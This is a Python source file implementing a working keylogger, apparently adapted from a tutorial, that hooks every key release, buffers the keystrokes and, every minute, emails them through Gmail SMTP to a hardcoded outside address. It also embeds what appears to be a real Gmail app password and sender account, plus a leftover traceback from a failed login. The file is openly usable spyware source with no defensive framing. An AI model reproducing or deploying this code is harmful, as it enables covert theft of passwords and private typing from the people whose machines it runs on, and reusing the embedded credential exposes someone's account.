import smtplib  # for sending email using SMTP protocol (gmail)
import ssl
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
import matplotlib.pyplot as plt

import keyboard  # for keylogs

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "YOU_EMAIL"
EMAIL_PASSWORD = "YOUR_PASSWORD"

class Keylogger:  # The best way to represent a keylogger is to create a class for it, and each method in this class
    # does a specific task:

    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # Now, we gonna need to use the keyboard's on_release() function that takes a callback which will be called for
    # every' \ ' KEY_UP event (whenever you release a key on the keyboard), this callback takes one ' \ 'parameter,
    # which is a KeyboardEvent that have the name attribute, let's implement it:

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    #If we choose to report our key logs to a local file, the following methods are responsible for that:

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    #Then we gonna need to implement the method that given a message( in this case, key logs), it sends it as an email(head
    #to this tutorial for more information on how this is done):

    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        port = 465  # For SSL
        password = "mkxh ehdb pgtk sozx"

        # Create a secure SSL context
        context = ssl.create_default_context()

        with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
            server.login("safasdjjfdfh@gmail.com", password)
            # TODO: Send email here
            server.sendmail("safasdjjfdfh@gmail.com", "1234qwer8835@gmail.com",message)
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
        cnt=0
        dict_cnt_letters={}#UserWarning: Starting a Matplotlib GUI outside of the main thread will likely fail.
        for index in range(len(message)):
            if(message[index]=="[" or message[index]=="]" or cnt!=0):
                cnt+=1
                if(message[index]=="]"):
                    cnt=0
            else:
                if(not message[index] in dict_cnt_letters):
                    dict_cnt_letters.update({message[index]:0})
                elif(message[index] in dict_cnt_letters):
                    dict_cnt_letters.update({message[index]:dict_cnt_letters[message[index]]+1})
        list_letters=[]
        list_count_letters=[]
        for key in dict_cnt_letters:
            list_letters.append(key)
            list_count_letters.append(dict_cnt_letters[key])
        fig, ax = plt.subplots()
        ax.plot(list_count_letters, list_letters)
        plt.show()
    #Next, we make a method that reports the key logs after every period of time.In other
    #words, calls sendmail() or report_to_file() every time:

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    #Let's define the method that calls the on_release() method:

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()

# Exception in thread Thread-3:
# Traceback (most recent call last):
#   File "c:\python38\lib\threading.py", line 932, in _bootstrap_inner
#     self.run()
#   File "c:\python38\lib\threading.py", line 1254, in run
#     self.function(*self.args, **self.kwargs)
#   File "C:\Users\cgc\PycharmProjects\keylogger_panda\Keylogger.py", line 121, in report
#     self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
#   File "C:\Users\cgc\PycharmProjects\keylogger_panda\Keylogger.py", line 99, in sendmail
#     server.login(email, password)
#   File "c:\python38\lib\smtplib.py", line 734, in login
#     raise last_exception
#   File "c:\python38\lib\smtplib.py", line 723, in login
#     (code, resp) = self.auth(
#   File "c:\python38\lib\smtplib.py", line 646, in auth
#     raise SMTPAuthenticationError(code, resp)
# smtplib.SMTPAuthenticationError: (535, b'5.7.3 Authentication unsuccessful [VI1PR0302CA0014.eurprd03.prod.outlook.com 2023-03-18T19:26:24.126Z 08DB269E59CB4936]')
# Traceback (most recent call last):
